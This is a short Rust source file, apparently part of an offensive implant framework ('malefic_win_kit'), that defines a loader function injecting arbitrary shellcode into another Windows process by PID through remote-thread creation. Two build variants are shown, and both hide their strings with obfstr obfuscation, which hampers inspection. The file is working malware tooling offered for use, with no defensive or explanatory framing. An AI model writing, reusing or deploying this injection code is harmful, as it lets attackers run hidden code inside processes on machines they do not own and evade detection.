use obfstr::obfstr;

#[cfg(feature = "prebuild")]
pub unsafe fn loader(bin: Vec<u8>, pid: u32) -> Result<String, String>
{
    use crate::win::kit::InjectRemoteThread;
    if bin.is_empty() {
        return Err(obfstr!("empty shellcode").to_string());
    }
    let ret = InjectRemoteThread(bin.as_ptr(), bin.len(), pid);
    let str = String::from_raw_parts(ret.data, ret.len, ret.capacity);
    return Ok(str);
}

#[cfg(feature = "source")]
pub unsafe fn loader(bin: Vec<u8>, pid: u32) -> Result<String, String> 
{
    use malefic_win_kit::dynamic::RunShellcode::inject_create_remote;
    if bin.is_empty() {
        return Err(obfstr!("empty shellcode").to_string());
    }
    let ret = inject_create_remote(bin, pid);
    if ret.is_ok() {
        return Ok(obfstr!("success!").to_string());
    } else {
        return Err(ret.err().unwrap());
    }
}